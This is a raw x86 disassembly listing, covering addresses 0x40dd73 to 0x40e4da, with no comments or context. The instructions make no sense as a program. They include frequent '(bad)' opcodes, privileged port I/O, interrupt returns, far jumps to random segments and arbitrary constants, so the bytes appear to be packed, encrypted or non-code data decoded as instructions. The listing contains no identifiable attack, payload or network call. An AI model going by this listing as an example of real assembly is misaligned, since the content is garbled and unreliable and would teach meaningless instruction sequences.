  40dd73:	ins    BYTE PTR es:[edi],dx
  40dd74:	loope  0x40dd52
  40dd76:	in     al,dx
  40dd77:	in     eax,0xc3
  40dd79:	iret   
  40dd7a:	ss push eax
  40dd7c:	iret   
  40dd7d:	fisttp QWORD PTR gs:[ebx]
  40dd80:	and    BYTE PTR [eax+0x5c],ah
  40dd83:	add    BYTE PTR [edx+0x54e43e6d],dl
  40dd89:	adc    eax,0xb228c153
  40dd8e:	mov    cl,0x95
  40dd90:	in     eax,dx
  40dd91:	retf   0x5324
  40dd94:	inc    BYTE PTR [ecx+0x5c54d2fe]
  40dd9a:	xchg   DWORD PTR [ebx+0x4cc19037],esi
  40dda0:	sar    edi,cl
  40dda2:	ret    0x8717
  40dda5:	xchg   edx,eax
  40dda6:	ss scas eax,DWORD PTR es:[edi]
  40dda8:	pop    edx
  40dda9:	sub    DWORD PTR [ecx-0x7c47c6b3],edx
  40ddaf:	lods   eax,DWORD PTR ds:[esi]
  40ddb0:	int3   
  40ddb1:	xchg   ecx,eax
  40ddb2:	fucomi st,st(4)
  40ddb4:	jp     0x40dd3a
  40ddb6:	or     al,0x70
  40ddb8:	clc    
  40ddb9:	xor    ah,0x33
  40ddbc:	mov    dh,0x3a
  40ddbe:	int    0x9d
  40ddc0:	cmp    DWORD PTR [ebx-0x3e1afbce],edx
  40ddc6:	pop    esp
  40ddc7:	je     0x40dd4e
  40ddc9:	jae    0x40ddb4
  40ddcb:	sub    DWORD PTR [edx+0x19],0xb592e455
  40ddd2:	daa    
  40ddd3:	xor    edx,ebp
  40ddd5:	jmp    0x40dd66
  40ddd7:	(bad)  
  40ddd8:	jmp    0x1e74e59a
  40dddd:	std    
  40ddde:	sub    DWORD PTR [edx+0x45],ecx
  40dde1:	int3   
  40dde2:	sbb    ebp,eax
  40dde4:	gs push ebp
  40dde6:	out    dx,al
  40dde7:	xchg   ebx,eax
  40dde8:	adc    al,0x49
  40ddea:	out    0xea,al
  40ddec:	cmp    DWORD PTR [edx],edi
  40ddee:	xchg   DWORD PTR [edx-0x74],ebp
  40ddf1:	push   ss
  40ddf2:	sub    BYTE PTR [edx-0x51],0x1c
  40ddf6:	fldenv [esi+0x7e]
  40ddf9:	imul   ebp,DWORD PTR [ebx-0x52],0xffffffa6
  40ddfd:	iret   
  40ddfe:	in     eax,dx
  40ddff:	push   ebx
  40de00:	mov    ch,0xc0
  40de02:	call   0x6ebb07b3
  40de07:	push   ss
  40de08:	cli    
  40de09:	sub    edi,DWORD PTR [ecx+0x5]
  40de0c:	(bad)  
  40de0d:	in     eax,dx
  40de0e:	xlat   BYTE PTR ds:[ebx]
  40de0f:	enter  0x1c92,0x1e
  40de13:	dec    edi
  40de14:	popa   
  40de15:	sbb    al,BYTE PTR [ecx]
  40de17:	ins    DWORD PTR es:[edi],dx
  40de18:	pop    edi
  40de19:	sar    edi,0xd6
  40de1c:	lahf   
  40de1d:	or     eax,0x147052c
  40de22:	dec    esi
  40de23:	dec    ebp
  40de24:	ficom  DWORD PTR [edx+0x4ee87de1]
  40de2a:	dec    edi
  40de2b:	popa   
  40de2c:	mov    eax,0x5e5484ef
  40de31:	adc    al,ch
  40de33:	sub    edi,DWORD PTR [ebx]
  40de35:	mov    edi,0x633b28e7
  40de3a:	and    cl,BYTE PTR [edi-0x7e]
  40de3d:	es ret 
  40de3f:	mov    esi,0x988ee879
  40de44:	and    ecx,DWORD PTR [esi-0x38]
  40de47:	in     eax,dx
  40de48:	cdq    
  40de49:	lds    ebx,FWORD PTR [eax+0x29]
  40de4c:	dec    ecx
  40de4d:	or     BYTE PTR [ebx],al
  40de4f:	test   DWORD PTR [eax-0x67],edi
  40de52:	in     al,dx
  40de53:	nop
  40de54:	mov    bh,0xd
  40de56:	mov    al,0x21
  40de58:	jmp    0x94b2f6f3
  40de5d:	(bad)  
  40de5e:	es ret 0x5324
  40de62:	int    0xb0
  40de64:	cmc    
  40de65:	mov    ah,0xaf
  40de67:	(bad)  
  40de68:	jb     0x40de35
  40de6a:	outs   dx,BYTE PTR ds:[esi]
  40de6b:	pop    esi
  40de6c:	mov    ebp,0xcb1fd196
  40de71:	ficom  DWORD PTR [ecx-0x1]
  40de74:	ficom  DWORD PTR [esi-0x8e95442]
  40de7a:	xchg   BYTE PTR [edi],bh
  40de7c:	push   eax
  40de7d:	jmp    0xcc66aaf4
  40de82:	aam    0x6e
  40de84:	or     BYTE PTR [ebx],bh
  40de86:	into   
  40de87:	and    BYTE PTR [ecx-0x3c1afa65],bh
  40de8d:	icebp  
  40de8e:	sub    eax,0x429c3350
  40de93:	cld    
  40de94:	pop    es
  40de95:	fild   WORD PTR [ecx]
  40de97:	push   ecx
  40de98:	mov    bh,0x30
  40de9a:	sbb    al,0x9
  40de9c:	push   ebp
  40de9d:	loopne 0x40deec
  40de9f:	mov    BYTE PTR [edi+0x38d3e21a],cl
  40dea5:	rcl    ecx,0x4e
  40dea8:	sbb    edx,0x482f1459
  40deae:	mov    edx,0xbb0f5e02
  40deb3:	(bad)  
  40deb4:	out    0xb2,eax
  40deb6:	pop    ss
  40deb7:	jmp    0x40de50
  40deb9:	jle    0x40de90
  40debb:	push   0xffffff90
  40debd:	idiv   DWORD PTR [ebp+0x5c5d5dab]
  40dec3:	repz call 0x619f:0xe95dad35
  40decb:	(bad)  
  40decc:	cs pusha 
  40dece:	arpl   dx,dx
  40ded0:	xor    al,0xd
  40ded2:	jecxz  0x40df44
  40ded4:	mov    al,ds:0x8c4dc222
  40ded9:	in     eax,0x88
  40dedb:	mov    esi,0xf9eb384c
  40dee0:	fst    QWORD PTR [ebx+ebp*1+0x45]
  40dee4:	stos   BYTE PTR es:[edi],al
  40dee5:	xor    eax,0x2c4b4162
  40deea:	pop    ds
  40deeb:	pop    ebx
  40deec:	pop    es
  40deed:	add    DWORD PTR [ebp+0x3ebc164a],esp
  40def3:	pusha  
  40def4:	dec    eax
  40def5:	mov    dh,cl
  40def7:	mov    DWORD PTR [ecx],eax
  40def9:	push   ebx
  40defa:	pop    DWORD PTR [edi+eax*4+0x72]
  40defe:	mov    BYTE PTR [eax],0xc0
  40df01:	pop    eax
  40df02:	arpl   WORD PTR [eax],cx
  40df04:	mov    ebp,0x31b45a5e
  40df09:	mov    esp,0xa1fd69a0
  40df0e:	shr    DWORD PTR [edx-0x57],cl
  40df11:	inc    ebx
  40df12:	jmp    0xb7daa3cf
  40df17:	inc    edx
  40df18:	jae    0x40dea2
  40df1a:	and    cl,bl
  40df1c:	repz or eax,0xf3573723
  40df22:	fdivrp st(1),st
  40df24:	push   ecx
  40df25:	fprem  
  40df27:	stc    
  40df28:	pop    ecx
  40df29:	popf   
  40df2a:	rcr    BYTE PTR [ebx],0x1e
  40df2d:	mov    ds:0xda6cc157,al
  40df32:	inc    ecx
  40df33:	std    
  40df34:	rcr    DWORD PTR [edi],0x12
  40df37:	sar    BYTE PTR [ecx-0x1b],cl
  40df3a:	pop    es
  40df3b:	(bad)  
  40df3c:	pop    edx
  40df3d:	push   esi
  40df3e:	jecxz  0x40df9b
  40df40:	ret    
  40df41:	mov    ah,0xfc
  40df43:	xor    BYTE PTR [eax*2-0x3eedd15f],0x22
  40df4b:	adc    DWORD PTR [edx+edi*2],0xffffff9e
  40df4f:	ret    
  40df50:	cmp    ah,dh
  40df52:	mov    al,ds:0xc5b768c4
  40df57:	pop    ss
  40df58:	std    
  40df59:	jle    0x40df39
  40df5b:	ror    dl,cl
  40df5d:	fstp   QWORD PTR [edx+0x2ac7d8bc]
  40df63:	mov    ebx,0xef3755de
  40df68:	out    dx,al
  40df69:	outs   dx,DWORD PTR ds:[esi]
  40df6a:	mov    ebx,0x41300f94
  40df6f:	push   esi
  40df70:	jnp    0x40df66
  40df72:	test   BYTE PTR [edi-0x1bc7b49b],dl
  40df78:	imul   ebx,DWORD PTR [ebx],0x5fbbd4c
  40df7e:	mov    bh,0x3
  40df80:	sbb    eax,0x9e33ba6
  40df85:	dec    edi
  40df86:	scas   al,BYTE PTR es:[edi]
  40df87:	dec    edx
  40df88:	sbb    eax,0x48946df0
  40df8d:	mov    BYTE PTR [esi+0x18],ah
  40df90:	aad    0x93
  40df92:	data16 mov ds:0xfea79c38,al
  40df98:	out    dx,al
  40df99:	jmp    0x2662:0x1683f969
  40dfa0:	push   ebx
  40dfa1:	and    al,dh
  40dfa3:	pop    edx
  40dfa4:	shl    BYTE PTR [esi+0x32],1
  40dfa7:	xchg   edx,eax
  40dfa8:	push   esi
  40dfa9:	in     al,dx
  40dfaa:	push   esi
  40dfab:	fnstenv [ebx-0x11e16875]
  40dfb1:	out    dx,eax
  40dfb2:	icebp  
  40dfb3:	cmc    
  40dfb4:	ds mov bl,0x6e
  40dfb7:	jb     0x40e01e
  40dfb9:	mov    ebp,0xa7825a19
  40dfbe:	mov    eax,ds:0xd66ecc14
  40dfc3:	jge    0x40e00c
  40dfc5:	mov    ds:0xbb65a9f5,eax
  40dfca:	aas    
  40dfcb:	sub    BYTE PTR [edx-0x28909cec],dl
  40dfd1:	add    al,0x73
  40dfd3:	ja     0x40e02d
  40dfd5:	sub    dl,bl
  40dfd7:	es pusha 
  40dfd9:	inc    esp
  40dfda:	inc    ebp
  40dfdb:	fdivr  DWORD PTR [eax]
  40dfdd:	pop    ds
  40dfde:	and    edi,DWORD PTR [ebp-0x6fed005f]
  40dfe4:	jo     0x40dfd6
  40dfe6:	mov    ch,0x55
  40dfe8:	sub    cl,BYTE PTR [ebp-0x2e]
  40dfeb:	pop    eax
  40dfec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfed:	push   ss
  40dfee:	mov    bl,dl
  40dff0:	jns    0x40e04b
  40dff2:	ins    DWORD PTR es:[edi],dx
  40dff3:	adc    dh,ch
  40dff5:	outs   dx,BYTE PTR ds:[esi]
  40dff6:	sub    BYTE PTR [eax+edx*2],cl
  40dff9:	jnp    0x40dff2
  40dffb:	cmp    dh,BYTE PTR [ebp-0x2d]
  40dffe:	sub    eax,0x43af16ee
  40e003:	xchg   ebp,eax
  40e004:	push   ecx
  40e005:	mov    al,ds:0x973e71e0
  40e00a:	scas   al,BYTE PTR es:[edi]
  40e00b:	sbb    al,0x5a
  40e00d:	cld    
  40e00e:	jb     0x40dfa8
  40e010:	(bad)  
  40e011:	and    dl,ah
  40e013:	sbb    bh,BYTE PTR [edx]
  40e015:	or     eax,0x52b99609
  40e01a:	push   ss
  40e01b:	sub    DWORD PTR [eax],0x7e
  40e01e:	jb     0x40dfec
  40e020:	mov    ds:0x6fdaa61,eax
  40e025:	or     DWORD PTR [esi+0x39],ebx
  40e028:	sub    eax,0xbc6fba30
  40e02d:	ret    0x3a30
  40e030:	(bad)  
  40e031:	out    0x86,eax
  40e033:	scas   al,BYTE PTR es:[edi]
  40e034:	xchg   ecx,eax
  40e035:	mov    ds:0x93adbd0a,eax
  40e03a:	add    al,BYTE PTR [eax]
  40e03c:	into   
  40e03d:	sahf   
  40e03e:	mov    bl,0x26
  40e040:	imul   esi,DWORD PTR [edi+0x26239e23],0xffffffbc
  40e047:	cmp    ch,BYTE PTR [ebx]
  40e049:	fwait
  40e04a:	jp     0x40e020
  40e04c:	mov    edx,0x1b6837b5
  40e051:	ins    DWORD PTR es:[edi],dx
  40e052:	out    dx,eax
  40e053:	mov    ds,edx
  40e055:	pusha  
  40e056:	mov    edi,0xbaf01acd
  40e05b:	sbb    bh,dl
  40e05d:	jl     0x40e07d
  40e05f:	shl    edi,1
  40e061:	test   al,0x67
  40e063:	imul   BYTE PTR [edx+0x68]
  40e066:	and    al,0xc7
  40e068:	arpl   WORD PTR [ebx+eiz*1+0x1080815],dx
  40e06f:	aaa    
  40e070:	mov    eax,0xd329c5fd
  40e075:	scas   al,BYTE PTR es:[edi]
  40e076:	sub    bh,BYTE PTR [ebx]
  40e078:	in     eax,0x15
  40e07a:	inc    ecx
  40e07b:	in     al,0x1e
  40e07d:	ret    0x9bb2
  40e080:	popf   
  40e081:	stos   DWORD PTR es:[edi],eax
  40e082:	inc    edx
  40e083:	nop
  40e084:	repnz repz (bad) [ebx+0x5b]
  40e089:	dec    edx
  40e08a:	scas   al,BYTE PTR es:[edi]
  40e08b:	mov    ebp,0x6961621b
  40e090:	mov    DWORD PTR [esi],esp
  40e092:	ins    DWORD PTR es:[edi],dx
  40e093:	pop    esi
  40e094:	pop    esi
  40e095:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e096:	pop    edi
  40e097:	sub    eax,0x17c4687c
  40e09c:	fs jmp 0x215071e
  40e0a2:	imul   ebp,esp,0xbb7434a2
  40e0a8:	or     DWORD PTR [edi],0x621b4fd9
  40e0ae:	adc    BYTE PTR [ebx+0x78],0x44
  40e0b2:	imul   BYTE PTR [ebx+edi*8-0x35]
  40e0b6:	scas   eax,DWORD PTR es:[edi]
  40e0b7:	sbb    ebx,DWORD PTR [ecx]
  40e0b9:	test   DWORD PTR [esi+0xc],edi
  40e0bc:	push   0xffffffcf
  40e0be:	cwde   
  40e0bf:	nop
  40e0c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0c1:	bound  edi,QWORD PTR [esi-0x9]
  40e0c4:	sub    eax,0xa178851a
  40e0c9:	sahf   
  40e0ca:	pushf  
  40e0cb:	adc    al,0xe9
  40e0cd:	sbb    ch,bh
  40e0cf:	mov    esp,DWORD PTR [esi+esi*8]
  40e0d2:	frstor [ecx+0x29ac8879]
  40e0d8:	out    dx,al
  40e0d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0da:	scas   al,BYTE PTR es:[edi]
  40e0db:	test   BYTE PTR [ecx+0x6f],ch
  40e0de:	ds cmp eax,0x91660b23
  40e0e4:	fiadd  WORD PTR [edi]
  40e0e6:	stc    
  40e0e7:	inc    ebp
  40e0e8:	loope  0x40e12f
  40e0ea:	dec    ebp
  40e0eb:	test   DWORD PTR [eax-0x29],eax
  40e0ee:	imul   esp,DWORD PTR [edx-0x6fd7d173],0x625c890d
  40e0f8:	ret    
  40e0f9:	pop    edi
  40e0fa:	(bad)  
  40e0fb:	cmc    
  40e0fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0fd:	mov    eax,ds:0x255cf1d0
  40e102:	loope  0x40e12f
  40e104:	es sub al,0xff
  40e107:	or     eax,0x777ae821
  40e10c:	mov    al,0x20
  40e10e:	cmp    DWORD PTR [edi+0x49],eax
  40e111:	inc    ebx
  40e112:	sub    eax,0x59c5fb94
  40e117:	leave  
  40e118:	rcr    cl,1
  40e11a:	les    esp,FWORD PTR [esi+0x119776a0]
  40e120:	ins    DWORD PTR es:[edi],dx
  40e121:	mov    eax,ds:0xc7316dcb
  40e126:	mov    ds:0xf2ca1509,eax
  40e12b:	or     edi,0xa1f4429a
  40e131:	mov    WORD PTR [edi-0xfb3159f],ss
  40e137:	mov    dl,0x63
  40e139:	(bad)  
  40e13a:	mov    esi,0x7b0f6c12
  40e13f:	cmp    dh,dl
  40e141:	add    ebp,DWORD PTR [ecx+0x3f]
  40e144:	repz int 0xe4
  40e147:	xchg   edi,eax
  40e148:	jne    0x40e1b9
  40e14a:	or     DWORD PTR [edi-0x1dc83da4],edx
  40e150:	dec    ebp
  40e151:	xchg   ecx,eax
  40e152:	pop    ss
  40e153:	adc    eax,0xad315ec1
  40e158:	popf   
  40e159:	mov    BYTE PTR [edx+0x47],ah
  40e15c:	xor    al,0x58
  40e15e:	adc    dl,0xc2
  40e161:	sbb    edi,DWORD PTR [ebx+0x5]
  40e164:	int3   
  40e165:	mov    ds,WORD PTR [ebp+0x4d7004a9]
  40e16b:	push   edi
  40e16c:	ret    
  40e16d:	xor    esi,ebp
  40e16f:	unpcklps xmm4,XMMWORD PTR [edi]
  40e172:	or     BYTE PTR [esi-0x16fa5334],bh
  40e178:	stos   BYTE PTR es:[edi],al
  40e179:	das    
  40e17a:	push   edi
  40e17b:	jb     0x40e153
  40e17d:	aad    0x97
  40e17f:	aas    
  40e180:	mov    edi,DWORD PTR [ebx+0x27]
  40e183:	sub    dh,bh
  40e185:	lea    ecx,[ecx]
  40e187:	clc    
  40e188:	cld    
  40e189:	call   0x4caf:0x64a57b6b
  40e190:	fisttp DWORD PTR [edi-0x1146e1d6]
  40e196:	xchg   DWORD PTR [esi+0x300639ce],ecx
  40e19c:	inc    edx
  40e19d:	cmp    cl,BYTE PTR [edi-0x18fa74f6]
  40e1a3:	adc    ah,BYTE PTR [ebx-0x2]
  40e1a6:	mul    BYTE PTR [edi-0x33]
  40e1a9:	test   BYTE PTR [edi-0x66],bl
  40e1ac:	shl    BYTE PTR [edi-0x32],0xc1
  40e1b0:	sub    ecx,0xb81350f2
  40e1b6:	adc    BYTE PTR [edx-0x59e0b112],al
  40e1bc:	xchg   edi,eax
  40e1bd:	gs aaa 
  40e1bf:	adc    DWORD PTR [ecx],ebp
  40e1c1:	inc    ebp
  40e1c2:	pop    esp
  40e1c3:	add    BYTE PTR [esp+ecx*8+0x1eb65701],cl
  40e1ca:	mov    eax,0x65a00ce1
  40e1cf:	add    al,0x42
  40e1d1:	add    DWORD PTR [edi+edi*4],ebx
  40e1d4:	in     al,dx
  40e1d5:	and    ch,bl
  40e1d7:	retf   0x2f8
  40e1da:	arpl   WORD PTR [eax],si
  40e1dc:	nop
  40e1dd:	lea    edi,[ebx-0x72]
  40e1e0:	push   edx
  40e1e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1e2:	leave  
  40e1e3:	cld    
  40e1e4:	(bad)  [esi+ebx*1+0x6b]
  40e1e8:	outs   dx,BYTE PTR ds:[esi]
  40e1e9:	les    edx,FWORD PTR [eax+0x27]
  40e1ec:	test   BYTE PTR [esi-0x6c],cl
  40e1ef:	pop    ecx
  40e1f0:	and    esi,ebx
  40e1f2:	jno    0x40e25c
  40e1f4:	xchg   esi,eax
  40e1f5:	in     eax,0xb8
  40e1f7:	mov    edi,0xabcb098e
  40e1fc:	prefetcht1 BYTE PTR [edi]
  40e1ff:	bnd jp 0x40e230
  40e202:	lea    esi,[eax-0x7b4487c9]
  40e208:	pop    ds
  40e209:	pop    edx
  40e20a:	fld    TBYTE PTR [esi+ecx*1+0x30]
  40e20e:	sbb    al,0x10
  40e210:	je     0x40e27a
  40e212:	mov    WORD PTR [ebx],gs
  40e214:	inc    esi
  40e215:	call   FWORD PTR [edx]
  40e217:	out    0x69,al
  40e219:	fistp  DWORD PTR [ecx+0x26]
  40e21c:	and    bh,BYTE PTR [eax+0x20]
  40e21f:	add    al,0xce
  40e221:	cmp    al,0x87
  40e223:	xchg   ebp,eax
  40e224:	lods   eax,DWORD PTR ss:[esi]
  40e226:	nop
  40e227:	test   BYTE PTR [edx+eax*2-0x482b6e4d],ah
  40e22e:	repz scas eax,DWORD PTR es:[edi]
  40e230:	retf   
  40e231:	push   edi
  40e232:	aaa    
  40e233:	push   esi
  40e234:	or     eax,0x1e9aa3be
  40e239:	imul   edx,ecx,0xffffffc7
  40e23c:	push   ebp
  40e23d:	jcxz   0x40e1d6
  40e240:	mov    ebp,0xbc8edf49
  40e245:	jno    0x40e287
  40e247:	les    edi,FWORD PTR [esi]
  40e249:	add    al,0x71
  40e24b:	jmp    0x40e1d2
  40e24d:	sub    al,0xa3
  40e24f:	outs   dx,DWORD PTR ds:[esi]
  40e250:	xchg   ch,ch
  40e252:	in     al,0xf
  40e254:	mov    ebx,0x62c34c18
  40e259:	xchg   esi,eax
  40e25a:	jbe    0x40e266
  40e25c:	stos   DWORD PTR es:[edi],eax
  40e25d:	adc    eax,DWORD PTR [ebp+eiz*1+0x405b4c98]
  40e264:	inc    edx
  40e265:	cmp    al,0xeb
  40e267:	sub    al,BYTE PTR [edi]
  40e269:	das    
  40e26a:	shl    BYTE PTR [ebp+0x3e],0x58
  40e26e:	or     al,0xa3
  40e270:	jg     0x40e2ea
  40e272:	call   0x7ec7:0x34ff341b
  40e279:	mov    bh,al
  40e27b:	inc    eax
  40e27c:	cmp    DWORD PTR ds:[eax],ebx
  40e27f:	mov    ebx,0x9d334d09
  40e284:	sahf   
  40e285:	xchg   edi,eax
  40e286:	xchg   esp,eax
  40e287:	lock nop
  40e289:	shl    BYTE PTR [edx-0x151329da],1
  40e28f:	in     eax,0x7c
  40e291:	mov    al,ds:0xf9cf0413
  40e296:	repz imul ecx,DWORD PTR ds:[ebp+0x70],0x1c71efd2
  40e29f:	cmp    esp,0xa
  40e2a2:	dec    esi
  40e2a3:	and    esp,DWORD PTR [eax]
  40e2a5:	sti    
  40e2a6:	int    0xdd
  40e2a8:	iret   
  40e2a9:	xor    ebp,DWORD PTR [eax+0xb]
  40e2ac:	or     ebx,ebx
  40e2ae:	leave  
  40e2af:	iret   
  40e2b0:	adc    eax,0xafc9aef7
  40e2b5:	das    
  40e2b6:	nop
  40e2b7:	jbe    0x40e308
  40e2b9:	pusha  
  40e2ba:	pop    ebx
  40e2bb:	jno    0x40e2ca
  40e2bd:	xchg   ecx,eax
  40e2be:	retf   0xb5b4
  40e2c1:	ins    BYTE PTR es:[edi],dx
  40e2c2:	ja     0x40e2c3
  40e2c4:	lea    ebx,[eax+0x5e542078]
  40e2ca:	int    0x87
  40e2cc:	ja     0x40e328
  40e2ce:	and    al,0x47
  40e2d0:	jb     0x40e2b1
  40e2d2:	stos   DWORD PTR es:[edi],eax
  40e2d3:	pop    eax
  40e2d4:	std    
  40e2d5:	stos   BYTE PTR es:[edi],al
  40e2d6:	pop    ebx
  40e2d7:	outs   dx,DWORD PTR ds:[esi]
  40e2d8:	mov    ebx,DWORD PTR [ecx]
  40e2da:	push   eax
  40e2db:	inc    esi
  40e2dc:	pcmpeqb mm7,QWORD PTR [esi-0x3e]
  40e2e0:	outs   dx,BYTE PTR ds:[esi]
  40e2e1:	fistp  QWORD PTR [ebp-0x20]
  40e2e4:	or     esp,esp
  40e2e6:	and    al,0x5d
  40e2e8:	or     eax,0x9696bfcb
  40e2ed:	xor    DWORD PTR [edi],0xffffff9b
  40e2f0:	inc    esi
  40e2f1:	adc    DWORD PTR [edi-0x5901c723],esp
  40e2f7:	jnp    0x40e2be
  40e2f9:	jb     0x40e2c8
  40e2fb:	sbb    BYTE PTR [eax+0x7f75b1e9],bh
  40e301:	push   es
  40e302:	scas   al,BYTE PTR es:[edi]
  40e303:	outs   dx,BYTE PTR ds:[esi]
  40e304:	in     al,dx
  40e305:	xor    BYTE PTR [edi],dh
  40e307:	inc    eax
  40e308:	fucomi st,st(5)
  40e30a:	test   eax,0x979902f5
  40e30f:	push   ebx
  40e310:	sbb    eax,0x4585f56d
  40e315:	mov    ah,0x96
  40e317:	adc    BYTE PTR [edi],bl
  40e319:	xchg   esi,eax
  40e31a:	xor    BYTE PTR [edx],ah
  40e31c:	out    0x83,al
  40e31e:	jnp    0x40e392
  40e320:	mov    al,ds:0x29082de1
  40e325:	inc    ecx
  40e326:	aas    
  40e327:	shr    DWORD PTR [ebx],0x4a
  40e32a:	test   BYTE PTR [esi],al
  40e32c:	jmp    0x40e33b
  40e32e:	push   cs
  40e32f:	mov    eax,ds:0xdf766924
  40e334:	out    0xdc,al
  40e336:	sbb    DWORD PTR [ebp+0x3d15eab5],esp
  40e33c:	mov    ebp,0xcfc90fd5
  40e341:	sbb    edx,edx
  40e343:	mov    dl,0x6b
  40e345:	fsincos 
  40e347:	test   al,0x4b
  40e349:	mov    edx,0x110c82b2
  40e34e:	jne    0x40e351
  40e350:	lock jb 0x40e31f
  40e353:	fadd   st(2),st
  40e355:	add    DWORD PTR [edx-0x4a58803e],eax
  40e35b:	dec    ecx
  40e35c:	test   BYTE PTR [esi-0x5a],ah
  40e35f:	sahf   
  40e360:	mov    al,0x2
  40e362:	out    dx,al
  40e363:	fwait
  40e364:	mov    dl,0x72
  40e366:	fbld   TBYTE PTR [ecx]
  40e368:	(bad)  
  40e369:	fild   WORD PTR [ecx-0x6d]
  40e36c:	and    DWORD PTR [ebp+edx*2+0x11],eax
  40e370:	out    0xe8,eax
  40e372:	mov    ebp,0x56712e52
  40e377:	in     eax,dx
  40e378:	rol    DWORD PTR [ecx+esi*4+0x15],1
  40e37c:	xlat   BYTE PTR ds:[ebx]
  40e37d:	aam    0x31
  40e37f:	pop    ecx
  40e380:	rcr    DWORD PTR [ebx],1
  40e382:	mov    eax,ds:0xd5e0c939
  40e387:	cmp    al,0xd0
  40e389:	cli    
  40e38a:	(bad)  
  40e38b:	out    0x65,eax
  40e38d:	push   ss
  40e38e:	fbld   TBYTE PTR ds:0x1654725
  40e394:	cmp    DWORD PTR [esi+0x5c],ecx
  40e397:	cli    
  40e398:	ficom  WORD PTR [edx+0x20]
  40e39b:	sbb    esi,edi
  40e39d:	lods   al,BYTE PTR ds:[esi]
  40e39e:	mov    DWORD PTR [ecx+eiz*2],esi
  40e3a1:	rcl    ebx,cl
  40e3a3:	jo     0x40e3a9
  40e3a5:	rcl    BYTE PTR [eax],0x8b
  40e3a8:	nop
  40e3a9:	xor    ah,al
  40e3ab:	mov    ebp,0x5f8aed3e
  40e3b0:	pop    ebp
  40e3b1:	and    dl,BYTE PTR [ecx+edi*2+0x11]
  40e3b5:	int    0xae
  40e3b7:	ret    
  40e3b8:	imul   edx
  40e3ba:	je     0x40e354
  40e3bc:	jnp    0x40e36e
  40e3be:	test   al,0x5b
  40e3c0:	add    ebx,DWORD PTR [edi-0x39]
  40e3c3:	pop    es
  40e3c4:	fdivr  DWORD PTR [esi-0x40fa9714]
  40e3ca:	sti    
  40e3cb:	in     eax,0x5b
  40e3cd:	cmp    eax,DWORD PTR [edx]
  40e3cf:	div    DWORD PTR [edi+0x222fb521]
  40e3d5:	mov    ds:0x43abfee4,al
  40e3da:	or     eax,0xa0b21358
  40e3df:	jbe    0x40e453
  40e3e1:	jmp    0xddee:0x8250bf12
  40e3e8:	jbe    0x40e422
  40e3ea:	adc    eax,0x143fedf0
  40e3ef:	pop    ebp
  40e3f0:	mov    bl,0x62
  40e3f2:	das    
  40e3f3:	xor    bl,ch
  40e3f5:	hlt    
  40e3f6:	xor    BYTE PTR [edi+0x67],0x76
  40e3fa:	fwait
  40e3fb:	ds in  al,0x5c
  40e3fe:	mov    eax,0x8b9f54fc
  40e403:	nop
  40e404:	hlt    
  40e405:	pusha  
  40e406:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e407:	mov    bh,0xe2
  40e409:	cmp    ebp,DWORD PTR [edi]
  40e40b:	inc    ebx
  40e40c:	push   es
  40e40d:	in     eax,dx
  40e40e:	mov    dl,dl
  40e410:	pusha  
  40e411:	test   DWORD PTR [edx+edi*4+0x4e792d5],0xe1cafc39
  40e41c:	or     DWORD PTR [edx+edi*2-0x7],0x1dfcfe56
  40e424:	sti    
  40e425:	retf   
  40e426:	mov    esi,0xd231b975
  40e42b:	(bad)  
  40e42c:	clc    
  40e42d:	push   edi
  40e42e:	xor    DWORD PTR [ebx-0xc],ebp
  40e431:	mov    edi,0x69e3888a
  40e436:	inc    eax
  40e437:	mov    ah,BYTE PTR [ebx-0x627377c8]
  40e43d:	mov    ebp,DWORD PTR [ecx-0x19e9e478]
  40e443:	stos   DWORD PTR es:[edi],eax
  40e444:	cld    
  40e445:	pop    es
  40e446:	or     esi,eax
  40e448:	jb     0x40e407
  40e44a:	cmc    
  40e44b:	push   eax
  40e44c:	add    ebp,ecx
  40e44e:	imul   BYTE PTR [eax+0x4b]
  40e451:	scas   eax,DWORD PTR es:[edi]
  40e452:	adc    BYTE PTR [ebp-0x3acfce6e],al
  40e458:	dec    ecx
  40e459:	repz enter 0x2d33,0x95
  40e45e:	and    BYTE PTR [ebp+0x43eab5eb],bl
  40e464:	push   ecx
  40e465:	nop
  40e466:	(bad)  
  40e467:	adc    al,0xd9
  40e469:	ins    BYTE PTR es:[edi],dx
  40e46a:	mov    dl,0xcf
  40e46c:	ror    DWORD PTR [ebx],cl
  40e46e:	or     DWORD PTR [ebp+0x41],edx
  40e471:	jl     0x40e463
  40e473:	jge    0x40e43c
  40e475:	or     al,0x4b
  40e477:	xor    cl,BYTE PTR [edx]
  40e479:	jl     0x40e4af
  40e47b:	xlat   BYTE PTR ds:[ebx]
  40e47c:	add    DWORD PTR [edx],esp
  40e47e:	(bad)  
  40e47f:	es jae 0x40e4ac
  40e482:	dec    esp
  40e483:	sub    edi,edx
  40e485:	inc    ecx
  40e486:	popa   
  40e487:	inc    ebp
  40e488:	xor    eax,0x19d9b979
  40e48d:	call   0xde01:0x8c1869ee
  40e494:	or     DWORD PTR [ebx+0xe],ecx
  40e497:	iret   
  40e498:	mov    WORD PTR [ecx+0x9],es
  40e49b:	push   0x1c1ffaed
  40e4a0:	cld    
  40e4a1:	add    ebp,ebp
  40e4a3:	out    0x16,eax
  40e4a5:	sub    BYTE PTR [esi],ah
  40e4a7:	jmp    0x15ea69f0
  40e4ac:	psubd  mm0,mm2
  40e4af:	in     eax,dx
  40e4b0:	mov    al,0xbf
  40e4b2:	xchg   ebp,eax
  40e4b3:	push   edi
  40e4b4:	add    dh,0x55
  40e4b7:	ss stos DWORD PTR es:[edi],eax
  40e4b9:	ins    DWORD PTR es:[edi],dx
  40e4ba:	mov    WORD PTR [ebx],ds
  40e4bc:	jbe    0x40e4b9
  40e4be:	dec    esi
  40e4bf:	jb     0x40e4ad
  40e4c1:	push   esi
  40e4c2:	or     BYTE PTR [edi+0x4d15cf70],0xa
  40e4c9:	pop    ecx
  40e4ca:	(bad)  
  40e4cb:	xor    BYTE PTR [ebx],0x38
  40e4ce:	and    ah,BYTE PTR [edx]
  40e4d0:	cmp    ch,al
  40e4d2:	fsub   DWORD PTR [edi-0x736671a1]
  40e4d8:	jne    0x40e4ca
  40e4da:	and    DWORD PTR [edi-0x71],edi
